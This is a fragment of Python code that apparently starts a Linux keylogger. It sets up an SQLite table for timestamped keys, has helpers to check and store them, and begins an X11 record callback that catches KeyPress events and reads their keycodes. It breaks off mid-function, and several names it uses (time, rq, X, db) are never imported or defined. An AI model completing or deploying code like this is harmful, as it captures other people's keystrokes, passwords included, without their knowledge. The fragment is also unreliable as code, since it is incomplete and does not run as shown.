import ctypes
import ctypes.util
import threading
import sqlite3

# SQLite3 database connection
conn = sqlite3.connect('data/data.db')
c = conn.cursor()

# Create table if it doesn't exist
c.execute("CREATE TABLE IF NOT EXISTS keys(timestamp INTEGER, key TEXT)")

# Check if the key is in the database
def check_db(key):
    c.execute("SELECT key FROM keys WHERE key=?", (key,))
    result = c.fetchone()
    if result:
        return True
    else:
        return False

# Add key to the database
def add_db(key):
    c.execute("INSERT INTO keys VALUES(?, ?)", (int(time.time()), key))
    conn.commit()

# X11
def record_callback(reply):
    data = reply.data
    while len(data):
        event, data = rq.EventField(None).parse_binary_value(data, db, None, None)

        if event.type == X.KeyPress:
            keycode = event.detail
           
